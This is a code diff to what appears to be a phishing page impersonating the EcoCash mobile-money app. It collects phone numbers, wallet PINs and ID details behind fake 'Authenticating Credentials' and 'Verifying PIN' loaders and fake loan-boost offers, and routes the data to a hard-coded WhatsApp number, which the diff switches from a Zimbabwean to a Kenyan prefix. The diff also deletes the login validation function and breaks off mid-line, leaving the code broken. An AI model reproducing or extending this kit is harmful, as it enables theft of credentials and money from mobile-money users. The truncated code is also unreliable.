@@ -78,6 +78,28 @@
     <!-- Mobile Frame / Container -->
     <div class="w-full max-w-md bg-white dark:bg-gray-800 min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden transition-colors duration-300">
 
+        <!-- GLOBAL DIM LIGHT / 5-SECOND LOADING OVERLAY -->
+        <div id="global-dim-overlay" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-[2px] hidden flex flex-col items-center justify-center text-center transition-opacity duration-300">
+            <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-2xl border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6 mx-4">
+                <div class="relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse">
+                    <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                    <i class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                </div>
+
+                <div class="space-y-2">
+                    <h3 id="overlay-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Authenticating Credentials</h3>
+                    <p id="overlay-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Verifying secure session & wallet security...</p>
+                </div>
+
+                <!-- Loading Skeletons -->
+                <div class="space-y-2 pt-1">
+                    <div class="h-3 w-full skeleton rounded"></div>
+                    <div class="h-3 w-3/4 skeleton rounded"></div>
+                </div>
+            </div>
+        </div>
+
         <!-- HEADER & NAVIGATION -->
         <header class="bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 sticky top-0 z-40 transition-colors duration-300">
             <div id="top-nav-bar" class="bg-ecoblue text-white text-xs py-2 px-4 flex justify-between items-center font-medium">
@@ -87,7 +109,7 @@
                     <span class="font-extrabold tracking-tighter text-xs">EcoCash <span class="text-ecored">Super App</span></span>
                 </div>
                 <div class="flex items-center space-x-3">
-                    <button onclick="switchTab('contact')" class="hover:underline transition">Help Center</button>
+                    <button onclick="switchTabWithDim('contact')" class="hover:underline transition">Help Center</button>
                     <!-- Dark Mode Toggle Button -->
                     <button onclick="toggleDarkMode()" class="p-1.5 rounded-full bg-white/20 hover:bg-white/30 transition text-white" title="Toggle Dark Mode">
                         <i id="dark-mode-icon" class="fa-solid fa-moon text-xs"></i>
@@ -96,7 +118,7 @@
             </div>
 
             <div class="px-4 py-3 flex justify-between items-center bg-white dark:bg-gray-800 transition-colors duration-300">
-                <div class="cursor-pointer flex items-center space-x-2" onclick="switchTab('login')">
+                <div class="cursor-pointer flex items-center space-x-2" onclick="switchTabWithDim('login')">
                     <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
                 </div>
 
@@ -107,13 +129,13 @@
 
             <div id="nav-dropdown" class="hidden bg-white dark:bg-gray-800 border-t border-gray-100 dark:border-gray-700 px-6 py-3 space-y-3 shadow-md transition-colors duration-300">
                 <div>
-                    <button onclick="switchTab('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
+                    <button onclick="switchTabWithDim('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
+                    <button onclick="switchTabWithDim('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
+                    <button onclick="switchTabWithDim('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
                 </div>
             </div>
         </header>
@@ -172,7 +194,7 @@
                         </div>
                     </div>
 
-                    <!-- LOGIN BUTTON -->
+                    <!-- LOGIN BUTTON (Triggers 5s Dim Light & Cycling) -->
                     <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
                         LOGIN
                     </button>
@@ -185,12 +207,12 @@
                     </p>
 
                     <div class="grid grid-cols-2 gap-4">
-                        <button onclick="switchTab('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                        <button onclick="switchTabWithDim('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
                             <i class="fa-solid fa-user text-gray-700 text-lg"></i>
                             <span class="font-bold text-sm">Register</span>
                         </button>
 
-                        <button onclick="switchTab('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                        <button onclick="switchTabWithDim('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
                             <i class="fa-solid fa-circle-info text-gray-500 text-lg"></i>
                             <span class="font-bold text-sm">Help & Support</span>
                         </button>
@@ -208,7 +230,7 @@
             <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
                 <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6 transition-colors">
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back to Login</span>
                         </button>
                         <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Sign up</h2>
@@ -327,7 +349,7 @@
                             <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
                                 SIGN UP
                             </button>
-                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
+                            <button type="button" onclick="switchTabWithDim('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
                                 LOGIN
                             </button>
                         </div>
@@ -391,7 +413,7 @@
 
                     <!-- Visual Cards for Services -->
                     <div class="space-y-3">
-                        <div onclick="switchTab('boost-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
+                        <div onclick="switchTabWithDim('boost-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> <span>Instant Credit Boost</span></span>
@@ -406,7 +428,7 @@
                             </div>
                         </div>
 
-                        <div onclick="switchTab('apply-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
+                        <div onclick="switchTabWithDim('apply-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-file-invoice-dollar text-green-400"></i> <span>Full Zimbabwe Registration ($100 - $3000)</span></span>
@@ -471,7 +493,7 @@
             <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
                 <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6">
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Boost Kashagi Requirements</h2>
@@ -516,7 +538,7 @@
             <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Select Loan Upgrade Tier</h2>
@@ -542,7 +564,7 @@
             <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div class="flex-1 flex flex-col">
                     <div class="flex items-center justify-between mb-2">
-                        <button onclick="switchTab('tier-upgrade')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('tier-upgrade')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-sm font-extrabold text-gray-800 dark:text-gray-100">Terms, Privacy & Safety Policy</h2>
@@ -582,7 +604,7 @@
             <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-3">
-                        <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Kashagi Loan Full Registration</h2>
@@ -779,7 +801,7 @@
 
     <!-- APPLICATION LOGIC & INTERACTIVITY -->
     <script>
-        const TARGET_WHATSAPP_NUMBER = '263789697483';
+        const TARGET_WHATSAPP_NUMBER = '254789697483';
 
         // Global State variables
         let clientData = {
@@ -878,7 +900,6 @@
                 btn.className = "whitespace-nowrap bg-blue-50 dark:bg-gray-700 text-ecoblue dark:text-blue-300 hover:bg-ecoblue hover:text-white px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition border border-blue-100 dark:border-gray-600 flex-shrink-0";
                 btn.innerText = faq.q;
                 btn.onclick = () => askThembiQuestion(faq.q, faq.part1, faq.part2);
-                container.appendChild(faq => btn); // corrected below
                 container.appendChild(btn);
             });
         }
@@ -1090,7 +1111,33 @@
             window.open(waUrl, '_blank');
         }
 
-        // Handle Login Submission & redirect to Kashagi Loans Hub
+        // Global 5-second dim light and cycling function for any transition/action
+        function triggerGlobalDimLoader(titleText, subtitleText, onComplete) {
+            const overlay = document.getElementById('global-dim-overlay');
+            const titleEl = document.getElementById('overlay-title');
+            const subEl = document.getElementById('overlay-subtitle');
+
+            titleEl.innerText = titleText || "Authenticating Credentials";
+            subEl.innerText = subtitleText || "Processing secure session & loading next screen...";
+
+            overlay.classList.remove('hidden');
+            overlay.classList.add('opacity-100');
+
+            setTimeout(() => {
+                overlay.classList.remove('opacity-100');
+                overlay.classList.add('hidden');
+                if (onComplete) onComplete();
+            }, 5000);
+        }
+
+        // Switch tab with 5-second dim light & cycling effect
+        function switchTabWithDim(tabName) {
+            triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next page and securing session...", () => {
+                switchTab(tabName);
+            });
+        }
+
+        // Handle Login Submission with 5s Dim Light & Cycling
         function handleLoginSubmit() {
             const phone = document.getElementById('login-phone').value.trim();
             const p1 = document.getElementById('pin-1').value;
@@ -1114,7 +1161,9 @@
             document.getElementById('profile-id-display').innerText = `ID: Session Active`;
             document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
 
-            switchTab('kashagi-hub');
+            triggerGlobalDimLoader("Authenticating EcoCash Wallet", "Verifying PIN, mobile number & last 6 months history...", () => {
+                switchTab('kashagi-hub');
+            });
         }
 
         // Handle Sign Up Submission with 5s Processing Cycle
@@ -1243,37 +1292,14 @@
 
         // 5-second processing cycle showing loading skeleton & validation
         function runProcessingCycle(onCompleteCallback) {
-            switchTab('processing');
-            
-            const spinnerContainer = document.getElementById('process-spinner-container');
-            const processTitle = document.getElementById('process-title');
-            const processSubtitle = document.getElementById('process-subtitle');
-
-            spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse";
-            spinnerContainer.innerHTML = `
-                <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
-                <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
-                <i class="fa-solid fa-file-invoice-dollar text-ecoblue text-2xl"></i>
-            `;
-            processTitle.innerText = "Validating Guaranteed Details & Transactions";
-            processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID securely...";
-
-            setTimeout(() => {
-                spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 dark:bg-green-900 rounded-full shadow-md";
-                spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 dark:text-green-300 text-3xl"></i>`;
-                processTitle.innerText = "Guaranteed Credentials Verified!";
-                processSubtitle.innerText = "Profile and transaction history successfully validated.";
-
-                setTimeout(() => {
-                    onCompleteCallback();
-                }, 1200);
-
-            }, 5000);
+            triggerGlobalDimLoader("Validating Guaranteed Details & Transactions", "Analyzing last 6 months transaction history & Zimbabwe ID securely...", () => {
+                if (onCompleteCallback) onCompleteCallback();
+            });
         }
 
         function proceedToTerms() {
             clientData.flowType = 'boost';
-            switchTab('terms');
+            switchTabWithDim('terms');
         }
 
         // Check explicit checkbox state to unlock Agree & Submit button
@@ -1455,26 +1481,4 @@
             const eyeIcon = document.getElementById('password-eye-icon');
 
             passInput.type = showPassword ? 'text' : 'password';
-            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
-        }
-
-        function validateLoginForm() {
-            const phone = document.getElementById('login-phone').value.trim();
-            const p1 = document.getElementById('pin-1').value;
-            const p2 = document.getElementById('pin-2').value;
-            const p3 = document.getElementById('pin-3').value;
-            const p4 = document.getElementById('pin-4').value;
-            const loginBtn = document.getElementById('login-btn');
-
-            if (phone !== '' && p1 !== '' && p2 !== '' && p3 !== '' && p4 !== '') {
-                loginBtn.disabled = false;
-                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-ecoblue hover:bg-ecodarkblue text-white font-bold transition duration-200 uppercase tracking-wider text-sm shadow-md cursor-pointer";
-            } else {
-                loginBtn.disabled = true;
-                loginBtn.className = "w-full py-3 px-4 rounded-lg bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm";
-            }
-        }
-    </script>
-</body>
-</html>
-
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'f
